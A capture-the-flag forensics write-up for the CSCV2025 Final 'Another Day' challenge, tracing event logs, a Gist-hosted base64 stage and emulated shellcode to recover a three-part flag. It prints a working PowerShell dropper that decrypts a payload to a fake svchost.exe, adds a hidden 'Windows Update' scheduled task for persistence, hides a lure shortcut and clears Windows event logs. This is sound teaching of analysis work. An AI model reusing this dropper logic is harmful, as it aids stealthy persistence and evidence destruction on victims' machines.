# CSCV2025-FINAL-WRITEUP
This is write up for challenge Another Day (Forensics) in CSCV2025 FINAL

**From: MTA.SUPPORT (Military Technical Academy)**

Hi everyone, last Sunday, I have done this Forensics challenge in Cybersecurity Contest Vietnam 2025 Final, so that today I want to share you the way to solve this challenge

<img width="602" height="449" alt="image" src="https://github.com/user-attachments/assets/9ce99831-9312-4e46-863e-59c861bd1ee6" />


1. Analysis file

- First, I download the file and unzip with the pass gave by author. After that, I get a challenge.ad1 file so that I gonna put it in a tool I really like, it is FTK Imager
  <img width="748" height="432" alt="image" src="https://github.com/user-attachments/assets/089cf683-500c-4c8f-a51e-79653076159c" />

   (this is a tree folder of the challenge file)

- Because this file is 4GB, so that there is a lot of trash information, I check some doubt file. Example: Users, Download, Windows,... (But there are not any information there)
- Next, I dig it to Logs and read it
<img width="1916" height="914" alt="image" src="https://github.com/user-attachments/assets/445bfd39-1172-44a3-8148-5edcd78096ad" />
- Because there too many files in Logs so I convert all the files .evtx to .csv to read easily

2. Read Logs

- To convert all the files, I use a tool name EvtxECmd (collect from EZTools), then copy file Logs from FTK Imager to this folder
<img width="1512" height="337" alt="image" src="https://github.com/user-attachments/assets/14ea33d8-de62-427e-bb57-70fedc762d63" />

- Next step, I open Command Prompt to use this tool with this command:
```bash
mkdir "D:\EvtxECmd\EvtxeCmd\Logs\CSV"

"D:\EvtxECmd\EvtxeCmd\EvtxECmd.exe" -d "D:\EvtxECmd\EvtxeCmd\Logs" --csv "D:\EvtxECmd\EvtxeCmd\Logs\CSV" --csvf "All_Results.csv"
```
- After that, I have all the .evtx file with the new extension .csv
<img width="1651" height="329" alt="image" src="https://github.com/user-attachments/assets/4b310322-cdc3-4efa-90b7-3f3918ce701d" />
- Following this, I use TimelineExplorer (also from EZTools) to read all the file .csv
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/13c676fd-2f95-41ca-9cce-1269b22a48d7" />
- I still focus only on Payload of all the files and find information from it
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/447087d3-3782-4eac-a5c2-6e6635c61e8f" />
 - After a long time only scroll and find doubt information, finally I find a Github link
<img width="1875" height="347" alt="image" src="https://github.com/user-attachments/assets/f0a6c6b0-5a4b-48bc-8054-91d2f41cdca5" />

- Full link is: https://gist.githubusercontent.com/oumazio/16f129048eb2e53c07c436592821e3bb/raw/a853270425582a8156c8eaac31c26e3ad4296655/easter_egg
<img width="1919" height="239" alt="image" src="https://github.com/user-attachments/assets/1eca9190-8d0b-47fa-b24a-cfcad5c4b8db" />
- I use Cyberchef to decode base64 strings:
<img width="1532" height="794" alt="image" src="https://github.com/user-attachments/assets/09629e2e-2a49-4ea2-86cf-12e97ab74ef6" />

- And got the Powershell code:

```powershell
$ErrorActionPreference = 'SilentlyContinue'

function XOR-Decrypt {
    param([byte[]]$Data, [string]$Key)
    $keyBytes = [Text.Encoding]::UTF8.GetBytes($Key)
    $dec = New-Object byte[] $Data.Length
    for($i=0; $i -lt $Data.Length; $i++){
        $dec[$i] = $Data[$i] -bxor $keyBytes[$i % $keyBytes.Length]
    }
    return $dec
}

$key = "chieccupthu6danhchodoran"
$shiPath = "$PWD\.shi"
$backgroundPath = "$PWD\background.png"
$targetPath = "$env:ProgramData\svchost.exe"
$publicPictures = "$env:Public\Pictures\background.png"

if (Test-Path $shiPath) {
    $encrypted = [IO.File]::ReadAllBytes($shiPath)
    $decrypted = XOR-Decrypt -Data $encrypted -Key $key
    
    $a1=@(0x9c,0x81,0x77,0xc1,0x97,0x82,0x69,0xa1,0xae,0x8d,0x55,0x3c,0x59,0x78,0x8c,0xba,0xae,0x6f,0x9a,0x74,0xae,0x90,0x6e,0xd2,0x9b,0x80,0x89,0xde,0xaa,0x8a,0x8d,0x75,0x6d,0x90,0x84,0xaf,0x83,0xaf,0xa5,0xb9,0xc5,0xa7,0x98,0x7b,0x79,0xad,0x73,0xb0,0x89,0xdb,0x6a,0x85,0x8a,0xa8,0x4c,0x74);
    $a2=@(0x38,0x39,0x2e,0x47,0x3f,0x50,0x1b,0x2b,0x4c,0x21,0x1c,0x0c,0x0c,0x47,0x53,0x47,0x4d,0x18,0x44,0x44,0x56,0x5d,0x1c,0x59,0x37,0x2a,0x1e,0x64,0x48,0x1e,0x54,0x45,0x1f,0x49,0x18,0x49,0x21,0x42,0x31,0x51,0x61,0x51,0x5f,0x12,0x2c,0x56,0x3e,0x3e,0x31,0x61,0x28,0x51,0x25,0x52,0x14,0x37);
    $decoded = -join ($a1[0..($a2.Length-1)] | ForEach-Object -Begin {$i=0} -Process {[char]($_ - $a2[$i++])})
    
    [IO.File]::WriteAllBytes($targetPath, $decrypted)
    
    if (Test-Path $backgroundPath) {
        Copy-Item $backgroundPath $publicPictures -Force
    }
    
    $action = New-ScheduledTaskAction -Execute $targetPath
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 30) -RepetitionDuration (New-TimeSpan -Days 365)
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
    Register-ScheduledTask -TaskName 'Windows Update' -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
    
    Start-ScheduledTask -TaskName 'Windows Update'
    
    if (Test-Path $shiPath) { Remove-Item $shiPath -Force -ErrorAction SilentlyContinue }
    if (Test-Path "$PWD\cv.pdf.lnk") { (Get-Item "$PWD\cv.pdf.lnk" -Force).Attributes = 'Hidden' }
    if (Test-Path $backgroundPath) { Remove-Item $backgroundPath -Force -ErrorAction SilentlyContinue }
    
    wevtutil cl System
    wevtutil cl Security
    wevtutil cl Application
    wevtutil cl "Windows PowerShell"
    wevtutil cl "Microsoft-Windows-PowerShell/Operational"
    
    if (Test-Path "$PWD\cv.pdf") {
        Start-Process "$PWD\cv.pdf"
    }
}
```
- Run this code and got the base64 strings: ``dHIzX2Nvbl90M19saWV0X3RydVkzbl90NGlfbmthdV9iMW5rXzB4eV8=``
- Decode it and got a part of the flag: ``tr3_con_t3_liet_truY3n_t4i_nkau_b1nk_0xy_``

- After have 1/3 of the flag, I continue to dig into the Payloads to find another part. Luckily, part3 is easy to find because it is in script:
<img width="1850" height="750" alt="image" src="https://github.com/user-attachments/assets/d50e67d6-8587-4d08-88bc-6a9b664ed3fc" />
<img width="1223" height="715" alt="image" src="https://github.com/user-attachments/assets/36d90bdc-918c-4a73-91a5-bea5cfe2d04c" />
=> part3 is: `kirit0kun_8142b5a11e55c693`

- The only problem is the remaining of 3 parts of the flag:

- Continuing scroll and find information, I find a malware name svchost.exe
<img width="1872" height="780" alt="image" src="https://github.com/user-attachments/assets/a5076df9-10f8-423c-a3c5-063181113328" />
- So that I find a path to the malware and got a binary file name ``shellcoders.bin``
<img width="1916" height="392" alt="image" src="https://github.com/user-attachments/assets/80f42bea-ae0b-4c40-ab9b-16e700cad0cb" />
@@ This file need to be Reverse so that I use a tool in Kali name **Speakeasy**

 - I use this command to reverse file shellcoders.bin
   `speakeasy -t shellcoders.bin -r -a amd64`
<img width="941" height="271" alt="image" src="https://github.com/user-attachments/assets/ca65d898-068d-42c3-a4ec-7507cb762811" />

=> flag part2: `s0n_tunq_mtP_884844_`

3. Summary

- part1: tr3_con_t3_liet_truY3n_t4i_nkau_b1nk_0xy_
- part2: s0n_tunq_mtP_884844_
- part3: kirit0kun_8142b5a11e55c693

Because the Author tell us to wrap it so that the finally flag is:

**CSCV2025{tr3_con_t3_liet_truY3n_t4i_nkau_b1nk_0xy_s0n_tunq_mtP_884844_kirit0kun_8142b5a11e55c693}**
